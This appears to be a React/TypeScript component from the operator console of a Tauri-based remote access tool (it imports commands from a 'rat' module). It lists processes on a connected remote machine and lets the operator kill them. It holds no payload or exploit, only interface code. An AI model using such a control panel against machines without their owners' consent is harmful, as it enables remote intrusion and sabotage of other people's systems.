import { useEffect, useState } from "react";
import { ProcessType } from "../../types";
import { processListCmd, killProcessCmd } from "../rat/RATCommands";
import { listen } from "@tauri-apps/api/event";
import { useParams } from "react-router-dom";
import {
  IconRefresh,
  IconProgressX,
  IconCpu,
  IconSearch,
  IconInfoCircle,
} from "@tabler/icons-react";

export const ProcessViewer: React.FC = () => {
  const { addr } = useParams();
  const [processes, setProcesses] = useState<ProcessType[] | null>(null);
  const [processFilter, setProcessFilter] = useState("");
  const [loading, setLoading] = useState(false);

  const handleKillProcess = async (pid: string, name: string) => {
    try {
      await killProcessCmd(addr, parseInt(pid), name);
      // Remove the process from the local state
      setProcesses((prevProcesses) =>
        prevProcesses
          ? prevProcesses.filter((process) => process.pid !== pid)
          : null
      );
    } catch (error) {
      console.error("Failed to kill process:", error);
    }
  };

  useEffect(() => {
    const unlisten = listen("process_list", (event: any) => {
      if (event.payload.addr === addr) {
        const parsedProcesses = event.payload.processes.map(
          (process: { pid: number; name: string }) => ({
            pid: process.pid.toString(),
            name: process.name,
          })
        );

        parsedProcesses.sort((a: any, b: any) => {
          return parseInt(a.pid) - parseInt(b.pid);
        });

        setProcesses(parsedProcesses);
        setLoading(false);
      }
    });

    fetchProcessList();

    return () => {
      unlisten.then((fn) => fn());
    };
  }, []);

  async function fetchProcessList() {
    setLoading(true);
    await processListCmd(addr);
  }

  const filteredProcesses = processes
    ? processes.filter((process) =>
        process.name.toLowerCase().includes(processFilter.toLowerCase())
      )
    : [];

  return (
    <div className="p-6 flex flex-1 flex-col overflow-auto w-full bg-primarybg h-screen">
      {/* Header */}
      <div className="flex justify-between items-center mb-6">
        <div className="flex items-center gap-2">
          <IconCpu size={28} className="text-accentx" />
          <h2 className="text-xl font-medium text-white">Process Viewer</h2>
        </div>
      </div>

      {/* Controls */}
      <div className="flex flex-row justify-between items-center mb-5">
        <button
          className="px-4 py-2.5 bg-secondarybg text-gray-200 hover:bg-accentx hover:text-white border border-gray-700 hover:border-accentx transition-all duration-200 rounded-lg flex items-center gap-2 cursor-pointer"
          onClick={fetchProcessList}
          disabled={loading}
        >
          <IconRefresh size={18} className={loading ? "animate-spin" : ""} />
          {loading ? "Refreshing..." : "Refresh Processes"}
        </button>

        <div className="w-80 relative">
          <div className="absolute inset-y-0 left-0 flex items-center pl-3 pointer-events-none">
            <IconSearch size={18} className="text-gray-400" />
          </div>
          <input
            value={processFilter}
            onChange={(e) => setProcessFilter(e.target.value)}
            type="text"
            className="pl-10 pr-4 py-2.5 w-full text-sm bg-secondarybg rounded-lg border border-gray-700 focus:border-accentx focus:outline-none focus:ring-1 focus:ring-accentx transition-all"
            placeholder="Filter processes..."
          />
        </div>
      </div>

      {/* Process List */}
      <div className="bg-secondarybg rounded-xl border border-gray-700 overflow-hidden flex-1">
        <div className="overflow-auto h-full">
          <table className="w-full text-sm text-left">
            <thead className="bg-primarybg text-gray-300 text-xs uppercase">
              <tr>
                <th className="px-6 py-3 w-24">PID</th>
                <th className="px-6 py-3">Process Name</th>
                <th className="px-6 py-3 text-right w-40">Actions</th>
              </tr>
            </thead>
            <tbody>
              {filteredProcesses.length > 0 ? (
                filteredProcesses.map((process, index) => (
                  <tr
                    key={index}
                    className="border-b border-gray-800 hover:bg-accentx"
                  >
                    <td className="px-6 py-3 font-mono">{process.pid}</td>
                    <td className="px-6 py-3">{process.name}</td>
                    <td className="px-6 py-3 text-right">
                      <button
                        className="cursor-pointer px-3 py-1.5 bg-red-900 text-white hover:bg-red-700 rounded flex items-center gap-1.5 ml-auto text-xs font-medium transition-colors"
                        onClick={() =>
                          handleKillProcess(process.pid, process.name)
                        }
                      >
                        <IconProgressX size={16} />
                        Kill
                      </button>
                    </td>
                  </tr>
                ))
              ) : (
                <tr>
                  <td colSpan={3} className="px-6 py-12 text-center">
                    {processes === null ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconRefresh size={24} className="animate-spin mb-2" />
                        <p>Loading processes...</p>
                      </div>
                    ) : processFilter ? (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconSearch size={24} className="mb-2" />
                        <p>No processes match your filter</p>
                      </div>
                    ) : (
                      <div className="flex flex-col items-center justify-center text-gray-400">
                        <IconInfoCircle size={24} className="mb-2" />
                        <p>No processes found</p>
                      </div>
                    )}
                  </td>
                </tr>
              )}
            </tbody>
          </table>
        </div>
      </div>

      {processes && filteredProcesses.length > 0 && (
        <div className="mt-3 text-xs text-gray-400">
          Showing {filteredProcesses.length} of {processes.length} processes
        </div>
      )}
    </div>
  );
};
